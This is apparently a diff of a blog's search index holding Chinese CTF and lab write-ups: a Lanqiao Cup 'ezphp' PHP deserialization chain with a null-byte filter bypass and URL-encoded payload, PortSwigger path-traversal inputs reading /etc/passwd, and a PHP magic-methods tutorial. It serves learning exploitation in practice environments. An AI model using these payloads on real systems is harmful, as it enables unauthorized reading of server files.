+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key === <span class="string">&quot;\0key\0&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>满足条件<code>key===&quot;\0key\0&quot;</code>即可读取flag文件中的内容</p>
+<p>往下看在<code>class B</code>和<code>class C</code>中存在三个魔术方法分别是:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()当一个对象被当作一个字符串使用</span><br></pre></td></tr></table></figure>
+<p>一开始就只想着构造反序列化POP链，仔细看了一下这个题貌似和反序列化没啥关系，只用触发__tostring()就行，所以思路就是：</p>
+<ol>
+<li>创建一个 <code>$key</code> 对象，该对象的类是 <code>A</code>，并将 <code>$key</code> 对象的 <code>key</code> 属性设置为 <code>\0key\0</code>。</li>
+<li>创建一个名为 <code>$f</code> 的数组，该数组包含两个元素。第一个元素是对 <code>$key</code> 对象进行序列化和反序列化后得到的新对象，第二个元素是字符串 <code>'readflag'</code>。</li>
+<li>创建一个 <code>$reflection</code> 对象，该对象的类是 <code>B</code>，并将 <code>$reflection</code> 对象的 <code>b</code> 属性设置为 <code>$f</code>。</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="string">&quot;\0key\0&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$key</span>-&gt;key = <span class="string">&quot;\0key\0&quot;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$key</span>)), <span class="string">&#x27;readflag&#x27;</span>);</span><br><span class="line"><span class="variable">$reflection</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$reflection</span>-&gt;b=<span class="variable">$f</span>;</span><br></pre></td></tr></table></figure>
+<p>接下来只需要对<code>$reflection</code>序列化就可以触发<code>__tostring</code>，但题目到这儿才算刚刚开始，接下来是如何bypass<code>strstr_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser)</code></p>
+<h3 id="0x02-bypassstrstr_ireplace000ser"><a class="markdownIt-Anchor" href="#0x02-bypassstrstr_ireplace000ser"></a> 0x02、bypass<code>strstr_ireplace(&quot;\0&quot;,&quot;00&quot;,$ser)</code></h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="string">&quot;\0key\0&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;b)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;s = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$key</span>-&gt;key = <span class="string">&quot;\\\0key\\\0&quot;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$key</span>)), <span class="string">&#x27;readflag&#x27;</span>);</span><br><span class="line"><span class="variable">$reflection</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$reflection</span>-&gt;b=<span class="variable">$f</span>;</span><br><span class="line"><span class="variable">$payload_str</span> = <span class="string">&#x27;&quot;;s:3:&quot;str&quot;;&#x27;</span> . <span class="title function_ invoke__">serialize</span>(<span class="variable">$reflection</span>) . <span class="string">&#x27;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$obj_len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$payload_str</span>);</span><br><span class="line"><span class="comment">//echo &quot;Length: &quot; . $obj_len;</span></span><br><span class="line"><span class="variable">$add_str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$obj_len</span>;<span class="variable">$i</span>++) <span class="variable">$add_str</span> = <span class="variable">$add_str</span> . <span class="string">&quot;\0&quot;</span>;</span><br><span class="line"><span class="comment">//echo &quot;&lt;br&gt;\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="string">&quot;1&quot;</span> . <span class="variable">$add_str</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;key&quot;;s:7:&#x27;</span>, <span class="string">&#x27;key&quot;;S:5:&#x27;</span>, <span class="variable">$payload_str</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00&quot;%3Bs%3A3%3A&quot;str&quot;%3BO%3A1%3A&quot;B&quot;%3A1%3A%7Bs%3A1%3A&quot;b&quot;%3Ba%3A2%3A%7Bi%3A0%3BO%3A1%3A&quot;A&quot;%3A1%3A%7Bs%3A3%3A&quot;key&quot;%3BS%3A5%3A&quot;%5C%00key%5C%00&quot;%3B%7Di%3A1%3Bs%3A8%3A&quot;readflag&quot;%3B%7D%7D%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2023/06/%E8%93%9D%E6%A1%A5%E6%9D%AFCTF-ezphp-Wirteup/image-20230604015354743.png" alt="image-20230604015354743"></p>
+]]></content>
+      <categories>
+        <category>赛事Writeup</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>CTF</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PortSwigger靶场练习(一):目录遍历(Directory traversal)</title>
+    <url>/2023/06/PortSwigger%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%80-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-Directory-traversal/</url>
+    <content><![CDATA[<p>PortSwigger靶场练习(一):目录遍历(Directory traversal)</p>
+<span id="more"></span>
+<h1 id="目录遍历directory-traversal"><a class="markdownIt-Anchor" href="#目录遍历directory-traversal"></a> 目录遍历(Directory traversal)</h1>
+<h2 id="第一关file-path-traversal-simple-case"><a class="markdownIt-Anchor" href="#第一关file-path-traversal-simple-case"></a> 第一关：File path traversal, simple case</h2>
+<p>直接抓取获取图片的包，构造<code>filename=../../../../etc/passwd/</code></p>
+<p><img src="/2023/06/PortSwigger%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%80-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-Directory-traversal/image-20230602232404266.png" alt="image-20230602232404266"></p>
+<p>简单说一下：首先可以猜测图片的存储路径为：<code>/var/www/images/x.jpg</code>，使用<code>../../../../ect/passwd</code>能够直接目录穿越到<code>/etc/passwd</code>，并读取相关内容。</p>
+<h2 id="第二关file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass"><a class="markdownIt-Anchor" href="#第二关file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass"></a> 第二关：File path traversal, traversal sequences blocked with absolute path bypass</h2>
+<p>首先试了一下<code>../../../etc/passwd</code>，回显提示<code>&quot;No such file&quot;</code>，考虑到靶场描述<code>absolute path</code>，</p>
+<p>直接构造<code>filename=/etc/passwd/</code></p>
+<p><img src="/2023/06/PortSwigger%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%80-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-Directory-traversal/image-20230602235352211.png" alt="image-20230602235352211"></p>
+]]></content>
+      <categories>
+        <category>技术学习</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Directory-traversal</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CISCN初赛-Writeup</title>
     <url>/2023/05/CISCN2023%E5%88%9D%E8%B5%9B-Writeup-1/</url>
     <content><![CDATA[<p>那啥，不好玩，没病别来玩，emmmmm，我建议*粹出题人还是亖一下比较好，整体体验，不好，明年不打了，</p>
@@ -1106,8 +1501,8 @@
       </categories>
       <tags>
         <tag>Writeup</tag>
-        <tag>web</tag>
         <tag>每日一题</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1475,7 +1870,7 @@ private：私有的</p>
 <p>为啥会产生这个漏洞呢？</p>
 <p>首先，我们先来了解一下什么是魔术方法！</p>
 <h4 id="魔术方法"><a class="markdownIt-Anchor" href="#魔术方法"></a> 魔术方法</h4>
-<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">__construct</span>()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line"><span class="built_in">__destruct</span>()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line"><span class="built_in">__toString</span>()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line"><span class="built_in">__invoke</span>()当尝试以调用函数的方式调用一个对象时，<span class="built_in">__invoke</span>() 方法会被自动调用。</span><br><span class="line"></span><br><span class="line"><span class="built_in">__sleep</span>() 在对象在被序列化<span class="built_in">unserialize</span>()之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化<span class="built_in">serialize</span>()之后立即被调用</span><br><span class="line"></span><br><span class="line">__call 在对象中调用一个不可访问方法时调用。(必须满足两个参数)</span><br><span class="line"></span><br><span class="line">__get 获得一个类的成员变量时调用;在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值</span><br><span class="line"></span><br><span class="line"><span class="built_in">__callStatic</span>() 在静态上下文中调用不可访问的方法时触发 </span><br><span class="line"></span><br><span class="line"><span class="built_in">__set</span>() 用于将数据写入不可访问的属性</span><br><span class="line"></span><br><span class="line"><span class="built_in">__isset</span>() 在不可访问的属性上调用<span class="built_in">isset</span>()或<span class="built_in">empty</span>()触发</span><br><span class="line"></span><br><span class="line"><span class="built_in">__unset</span>() 在不可访问的属性上使用<span class="built_in">unset</span>()时触发</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>()当尝试以调用函数的方式调用一个对象时，<span class="title function_ invoke__">__invoke</span>() 方法会被自动调用。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() 在对象在被序列化<span class="title function_ invoke__">unserialize</span>()之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化<span class="title function_ invoke__">serialize</span>()之后立即被调用</span><br><span class="line"></span><br><span class="line">__call 在对象中调用一个不可访问方法时调用。(必须满足两个参数)</span><br><span class="line"></span><br><span class="line">__get 获得一个类的成员变量时调用;在程序运行过程中，通过它可以在对象的外部获取私有成员属性的值</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() 在静态上下文中调用不可访问的方法时触发 </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__set</span>() 用于将数据写入不可访问的属性</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() 在不可访问的属性上调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()触发</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() 在不可访问的属性上使用<span class="keyword">unset</span>()时触发</span><br></pre></td></tr></table></figure>
 <h5 id="demo"><a class="markdownIt-Anchor" href="#demo"></a> Demo</h5>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hource</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span> = <span class="number">114</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$f1</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;(s)(e)(r)(i)(a)(l)(i)(z)(e)(!)&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;Do_you_know_unserialize_?&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$name</span>==<span class="string">&quot;size&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;size&gt;<span class="number">100</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;size-<span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString tigger&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is __invoke&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Do_you_know_serialize_?&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Hource</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>-&gt;age;</span><br></pre></td></tr></table></figure>
 <p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20221018211456021-16672739578731.png" alt="test"></p>
